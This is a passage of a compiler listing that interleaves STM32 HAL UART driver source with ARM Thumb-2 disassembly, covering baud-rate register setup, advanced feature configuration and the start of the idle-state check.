        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 8005a14:	69bb      	ldr	r3, [r7, #24]
 8005a16:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 8005a1a:	d308      	bcc.n	8005a2e <UART_SetConfig+0x2b2>
 8005a1c:	69bb      	ldr	r3, [r7, #24]
 8005a1e:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a22:	d204      	bcs.n	8005a2e <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 8005a24:	68fb      	ldr	r3, [r7, #12]
 8005a26:	681b      	ldr	r3, [r3, #0]
 8005a28:	69ba      	ldr	r2, [r7, #24]
 8005a2a:	60da      	str	r2, [r3, #12]
 8005a2c:	e0c2      	b.n	8005bb4 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 8005a2e:	2301      	movs	r3, #1
 8005a30:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005a34:	e0be      	b.n	8005bb4 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 8005a36:	68fb      	ldr	r3, [r7, #12]
 8005a38:	69db      	ldr	r3, [r3, #28]
 8005a3a:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 8005a3e:	d16a      	bne.n	8005b16 <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 8005a40:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005a44:	2b08      	cmp	r3, #8
 8005a46:	d834      	bhi.n	8005ab2 <UART_SetConfig+0x336>
 8005a48:	a201      	add	r2, pc, #4	; (adr r2, 8005a50 <UART_SetConfig+0x2d4>)
 8005a4a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005a4e:	bf00      	nop
 8005a50:	08005a75 	.word	0x08005a75
 8005a54:	08005a95 	.word	0x08005a95
 8005a58:	08005a9d 	.word	0x08005a9d
 8005a5c:	08005ab3 	.word	0x08005ab3
 8005a60:	08005aa3 	.word	0x08005aa3
 8005a64:	08005ab3 	.word	0x08005ab3
 8005a68:	08005ab3 	.word	0x08005ab3
 8005a6c:	08005ab3 	.word	0x08005ab3
 8005a70:	08005aab 	.word	0x08005aab
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005a74:	f7fe fdec 	bl	8004650 <HAL_RCC_GetPCLK1Freq>
 8005a78:	61f8      	str	r0, [r7, #28]
        break;
 8005a7a:	e020      	b.n	8005abe <UART_SetConfig+0x342>
 8005a7c:	efff69f3 	.word	0xefff69f3
 8005a80:	40008000 	.word	0x40008000
 8005a84:	40013800 	.word	0x40013800
 8005a88:	40021000 	.word	0x40021000
 8005a8c:	40004400 	.word	0x40004400
 8005a90:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005a94:	f7fe fdf2 	bl	800467c <HAL_RCC_GetPCLK2Freq>
 8005a98:	61f8      	str	r0, [r7, #28]
        break;
 8005a9a:	e010      	b.n	8005abe <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005a9c:	4b4c      	ldr	r3, [pc, #304]	; (8005bd0 <UART_SetConfig+0x454>)
 8005a9e:	61fb      	str	r3, [r7, #28]
        break;
 8005aa0:	e00d      	b.n	8005abe <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005aa2:	f7fe fd3d 	bl	8004520 <HAL_RCC_GetSysClockFreq>
 8005aa6:	61f8      	str	r0, [r7, #28]
        break;
 8005aa8:	e009      	b.n	8005abe <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005aaa:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005aae:	61fb      	str	r3, [r7, #28]
        break;
 8005ab0:	e005      	b.n	8005abe <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 8005ab2:	2300      	movs	r3, #0
 8005ab4:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005ab6:	2301      	movs	r3, #1
 8005ab8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005abc:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005abe:	69fb      	ldr	r3, [r7, #28]
 8005ac0:	2b00      	cmp	r3, #0
 8005ac2:	d077      	beq.n	8005bb4 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005ac4:	69fb      	ldr	r3, [r7, #28]
 8005ac6:	005a      	lsls	r2, r3, #1
 8005ac8:	68fb      	ldr	r3, [r7, #12]
 8005aca:	685b      	ldr	r3, [r3, #4]
 8005acc:	085b      	lsrs	r3, r3, #1
 8005ace:	441a      	add	r2, r3
 8005ad0:	68fb      	ldr	r3, [r7, #12]
 8005ad2:	685b      	ldr	r3, [r3, #4]
 8005ad4:	fbb2 f3f3 	udiv	r3, r2, r3
 8005ad8:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005ada:	69bb      	ldr	r3, [r7, #24]
 8005adc:	2b0f      	cmp	r3, #15
 8005ade:	d916      	bls.n	8005b0e <UART_SetConfig+0x392>
 8005ae0:	69bb      	ldr	r3, [r7, #24]
 8005ae2:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005ae6:	d212      	bcs.n	8005b0e <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005ae8:	69bb      	ldr	r3, [r7, #24]
 8005aea:	b29b      	uxth	r3, r3
 8005aec:	f023 030f 	bic.w	r3, r3, #15
 8005af0:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 8005af2:	69bb      	ldr	r3, [r7, #24]
 8005af4:	085b      	lsrs	r3, r3, #1
 8005af6:	b29b      	uxth	r3, r3
 8005af8:	f003 0307 	and.w	r3, r3, #7
 8005afc:	b29a      	uxth	r2, r3
 8005afe:	8afb      	ldrh	r3, [r7, #22]
 8005b00:	4313      	orrs	r3, r2
 8005b02:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005b04:	68fb      	ldr	r3, [r7, #12]
 8005b06:	681b      	ldr	r3, [r3, #0]
 8005b08:	8afa      	ldrh	r2, [r7, #22]
 8005b0a:	60da      	str	r2, [r3, #12]
 8005b0c:	e052      	b.n	8005bb4 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005b0e:	2301      	movs	r3, #1
 8005b10:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005b14:	e04e      	b.n	8005bb4 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 8005b16:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005b1a:	2b08      	cmp	r3, #8
 8005b1c:	d827      	bhi.n	8005b6e <UART_SetConfig+0x3f2>
 8005b1e:	a201      	add	r2, pc, #4	; (adr r2, 8005b24 <UART_SetConfig+0x3a8>)
 8005b20:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005b24:	08005b49 	.word	0x08005b49
 8005b28:	08005b51 	.word	0x08005b51
 8005b2c:	08005b59 	.word	0x08005b59
 8005b30:	08005b6f 	.word	0x08005b6f
 8005b34:	08005b5f 	.word	0x08005b5f
 8005b38:	08005b6f 	.word	0x08005b6f
 8005b3c:	08005b6f 	.word	0x08005b6f
 8005b40:	08005b6f 	.word	0x08005b6f
 8005b44:	08005b67 	.word	0x08005b67
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005b48:	f7fe fd82 	bl	8004650 <HAL_RCC_GetPCLK1Freq>
 8005b4c:	61f8      	str	r0, [r7, #28]
        break;
 8005b4e:	e014      	b.n	8005b7a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005b50:	f7fe fd94 	bl	800467c <HAL_RCC_GetPCLK2Freq>
 8005b54:	61f8      	str	r0, [r7, #28]
        break;
 8005b56:	e010      	b.n	8005b7a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005b58:	4b1d      	ldr	r3, [pc, #116]	; (8005bd0 <UART_SetConfig+0x454>)
 8005b5a:	61fb      	str	r3, [r7, #28]
        break;
 8005b5c:	e00d      	b.n	8005b7a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005b5e:	f7fe fcdf 	bl	8004520 <HAL_RCC_GetSysClockFreq>
 8005b62:	61f8      	str	r0, [r7, #28]
        break;
 8005b64:	e009      	b.n	8005b7a <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005b66:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005b6a:	61fb      	str	r3, [r7, #28]
        break;
 8005b6c:	e005      	b.n	8005b7a <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005b6e:	2300      	movs	r3, #0
 8005b70:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005b72:	2301      	movs	r3, #1
 8005b74:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005b78:	bf00      	nop
    }

    if (pclk != 0U)
 8005b7a:	69fb      	ldr	r3, [r7, #28]
 8005b7c:	2b00      	cmp	r3, #0
 8005b7e:	d019      	beq.n	8005bb4 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005b80:	68fb      	ldr	r3, [r7, #12]
 8005b82:	685b      	ldr	r3, [r3, #4]
 8005b84:	085a      	lsrs	r2, r3, #1
 8005b86:	69fb      	ldr	r3, [r7, #28]
 8005b88:	441a      	add	r2, r3
 8005b8a:	68fb      	ldr	r3, [r7, #12]
 8005b8c:	685b      	ldr	r3, [r3, #4]
 8005b8e:	fbb2 f3f3 	udiv	r3, r2, r3
 8005b92:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005b94:	69bb      	ldr	r3, [r7, #24]
 8005b96:	2b0f      	cmp	r3, #15
 8005b98:	d909      	bls.n	8005bae <UART_SetConfig+0x432>
 8005b9a:	69bb      	ldr	r3, [r7, #24]
 8005b9c:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005ba0:	d205      	bcs.n	8005bae <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 8005ba2:	69bb      	ldr	r3, [r7, #24]
 8005ba4:	b29a      	uxth	r2, r3
 8005ba6:	68fb      	ldr	r3, [r7, #12]
 8005ba8:	681b      	ldr	r3, [r3, #0]
 8005baa:	60da      	str	r2, [r3, #12]
 8005bac:	e002      	b.n	8005bb4 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005bae:	2301      	movs	r3, #1
 8005bb0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005bb4:	68fb      	ldr	r3, [r7, #12]
 8005bb6:	2200      	movs	r2, #0
 8005bb8:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005bba:	68fb      	ldr	r3, [r7, #12]
 8005bbc:	2200      	movs	r2, #0
 8005bbe:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005bc0:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005bc4:	4618      	mov	r0, r3
 8005bc6:	3728      	adds	r7, #40	; 0x28
 8005bc8:	46bd      	mov	sp, r7
 8005bca:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005bce:	bf00      	nop
 8005bd0:	00f42400 	.word	0x00f42400

08005bd4 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005bd4:	b480      	push	{r7}
 8005bd6:	b083      	sub	sp, #12
 8005bd8:	af00      	add	r7, sp, #0
 8005bda:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005bdc:	687b      	ldr	r3, [r7, #4]
 8005bde:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005be0:	f003 0308 	and.w	r3, r3, #8
 8005be4:	2b00      	cmp	r3, #0
 8005be6:	d00a      	beq.n	8005bfe <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005be8:	687b      	ldr	r3, [r7, #4]
 8005bea:	681b      	ldr	r3, [r3, #0]
 8005bec:	685b      	ldr	r3, [r3, #4]
 8005bee:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005bf2:	687b      	ldr	r3, [r7, #4]
 8005bf4:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005bf6:	687b      	ldr	r3, [r7, #4]
 8005bf8:	681b      	ldr	r3, [r3, #0]
 8005bfa:	430a      	orrs	r2, r1
 8005bfc:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005bfe:	687b      	ldr	r3, [r7, #4]
 8005c00:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c02:	f003 0301 	and.w	r3, r3, #1
 8005c06:	2b00      	cmp	r3, #0
 8005c08:	d00a      	beq.n	8005c20 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005c0a:	687b      	ldr	r3, [r7, #4]
 8005c0c:	681b      	ldr	r3, [r3, #0]
 8005c0e:	685b      	ldr	r3, [r3, #4]
 8005c10:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005c14:	687b      	ldr	r3, [r7, #4]
 8005c16:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005c18:	687b      	ldr	r3, [r7, #4]
 8005c1a:	681b      	ldr	r3, [r3, #0]
 8005c1c:	430a      	orrs	r2, r1
 8005c1e:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005c20:	687b      	ldr	r3, [r7, #4]
 8005c22:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c24:	f003 0302 	and.w	r3, r3, #2
 8005c28:	2b00      	cmp	r3, #0
 8005c2a:	d00a      	beq.n	8005c42 <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005c2c:	687b      	ldr	r3, [r7, #4]
 8005c2e:	681b      	ldr	r3, [r3, #0]
 8005c30:	685b      	ldr	r3, [r3, #4]
 8005c32:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005c36:	687b      	ldr	r3, [r7, #4]
 8005c38:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005c3a:	687b      	ldr	r3, [r7, #4]
 8005c3c:	681b      	ldr	r3, [r3, #0]
 8005c3e:	430a      	orrs	r2, r1
 8005c40:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005c42:	687b      	ldr	r3, [r7, #4]
 8005c44:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c46:	f003 0304 	and.w	r3, r3, #4
 8005c4a:	2b00      	cmp	r3, #0
 8005c4c:	d00a      	beq.n	8005c64 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005c4e:	687b      	ldr	r3, [r7, #4]
 8005c50:	681b      	ldr	r3, [r3, #0]
 8005c52:	685b      	ldr	r3, [r3, #4]
 8005c54:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005c58:	687b      	ldr	r3, [r7, #4]
 8005c5a:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005c5c:	687b      	ldr	r3, [r7, #4]
 8005c5e:	681b      	ldr	r3, [r3, #0]
 8005c60:	430a      	orrs	r2, r1
 8005c62:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005c64:	687b      	ldr	r3, [r7, #4]
 8005c66:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c68:	f003 0310 	and.w	r3, r3, #16
 8005c6c:	2b00      	cmp	r3, #0
 8005c6e:	d00a      	beq.n	8005c86 <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005c70:	687b      	ldr	r3, [r7, #4]
 8005c72:	681b      	ldr	r3, [r3, #0]
 8005c74:	689b      	ldr	r3, [r3, #8]
 8005c76:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005c7a:	687b      	ldr	r3, [r7, #4]
 8005c7c:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005c7e:	687b      	ldr	r3, [r7, #4]
 8005c80:	681b      	ldr	r3, [r3, #0]
 8005c82:	430a      	orrs	r2, r1
 8005c84:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005c86:	687b      	ldr	r3, [r7, #4]
 8005c88:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c8a:	f003 0320 	and.w	r3, r3, #32
 8005c8e:	2b00      	cmp	r3, #0
 8005c90:	d00a      	beq.n	8005ca8 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005c92:	687b      	ldr	r3, [r7, #4]
 8005c94:	681b      	ldr	r3, [r3, #0]
 8005c96:	689b      	ldr	r3, [r3, #8]
 8005c98:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005c9c:	687b      	ldr	r3, [r7, #4]
 8005c9e:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005ca0:	687b      	ldr	r3, [r7, #4]
 8005ca2:	681b      	ldr	r3, [r3, #0]
 8005ca4:	430a      	orrs	r2, r1
 8005ca6:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005ca8:	687b      	ldr	r3, [r7, #4]
 8005caa:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005cac:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005cb0:	2b00      	cmp	r3, #0
 8005cb2:	d01a      	beq.n	8005cea <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005cb4:	687b      	ldr	r3, [r7, #4]
 8005cb6:	681b      	ldr	r3, [r3, #0]
 8005cb8:	685b      	ldr	r3, [r3, #4]
 8005cba:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005cbe:	687b      	ldr	r3, [r7, #4]
 8005cc0:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005cc2:	687b      	ldr	r3, [r7, #4]
 8005cc4:	681b      	ldr	r3, [r3, #0]
 8005cc6:	430a      	orrs	r2, r1
 8005cc8:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005cca:	687b      	ldr	r3, [r7, #4]
 8005ccc:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005cce:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005cd2:	d10a      	bne.n	8005cea <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005cd4:	687b      	ldr	r3, [r7, #4]
 8005cd6:	681b      	ldr	r3, [r3, #0]
 8005cd8:	685b      	ldr	r3, [r3, #4]
 8005cda:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005cde:	687b      	ldr	r3, [r7, #4]
 8005ce0:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005ce2:	687b      	ldr	r3, [r7, #4]
 8005ce4:	681b      	ldr	r3, [r3, #0]
 8005ce6:	430a      	orrs	r2, r1
 8005ce8:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005cea:	687b      	ldr	r3, [r7, #4]
 8005cec:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005cee:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005cf2:	2b00      	cmp	r3, #0
 8005cf4:	d00a      	beq.n	8005d0c <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005cf6:	687b      	ldr	r3, [r7, #4]
 8005cf8:	681b      	ldr	r3, [r3, #0]
 8005cfa:	685b      	ldr	r3, [r3, #4]
 8005cfc:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005d00:	687b      	ldr	r3, [r7, #4]
 8005d02:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005d04:	687b      	ldr	r3, [r7, #4]
 8005d06:	681b      	ldr	r3, [r3, #0]
 8005d08:	430a      	orrs	r2, r1
 8005d0a:	605a      	str	r2, [r3, #4]
  }
}
 8005d0c:	bf00      	nop
 8005d0e:	370c      	adds	r7, #12
 8005d10:	46bd      	mov	sp, r7
 8005d12:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d16:	4770      	bx	lr

08005d18 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005d18:	b580      	push	{r7, lr}
 8005d1a:	b098      	sub	sp, #96	; 0x60
 8005d1c:	af02      	add	r7, sp, #8
 8005d1e:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005d20:	687b      	ldr	r3, [r7, #4]
 8005d22:	2200      	movs	r2, #0
 8005d24:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005d28:	f7fb fb62 	bl	80013f0 <HAL_GetTick>
 8005d2c:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005d2e:	687b      	ldr	r3, [r7, #4]
 8005d30:	681b      	ldr	r3, [r3, #0]
 8005d32:	681b      	ldr	r3, [r3, #0]
 8005d34:	f003 0308 	and.w	r3, r3, #8
 8005d38:	2b08      	cmp	r3, #8
 8005d3a:	d12e      	bne.n	8005d9a <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005d3c:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005d40:	9300      	str	r3, [sp, #0]
 8005d42:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005d44:	2200      	movs	r2, #0
 8005d46:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005d4a:	6878      	ldr	r0, [r7, #4]
 8005d4c:	f000 f88c 	bl	8005e68 <UART_WaitOnFlagUntilTimeout>
 8005d50:	4603      	mov	r3, r0
 8005d52:	2b00      	cmp	r3, #0
 8005d54:	d021      	beq.n	8005d9a <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005d56:	687b      	ldr	r3, [r7, #4]
 8005d58:	681b      	ldr	r3, [r3, #0]
 8005d5a:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d5c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d5e:	e853 3f00 	ldrex	r3, [r3]
 8005d62:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005d64:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005d66:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005d6a:	653b      	str	r3, [r7, #80]	; 0x50
 8005d6c:	687b      	ldr	r3, [r7, #4]
 8005d6e:	681b      	ldr	r3, [r3, #0]
 8005d70:	461a      	mov	r2, r3
 8005d72:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005d74:	647b      	str	r3, [r7, #68]	; 0x44
 8005d76:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d78:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005d7a:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005d7c:	e841 2300 	strex	r3, r2, [r1]
 8005d80:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005d82:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005d84:	2b00      	cmp	r3, #0
 8005d86:	d1e6      	bne.n	8005d56 <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005d88:	687b      	ldr	r3, [r7, #4]
 8005d8a:	2220      	movs	r2, #32
 8005d8c:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005d8e:	687b      	ldr	r3, [r7, #4]
 8005d90:	2200      	movs	r2, #0
 8005d92:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
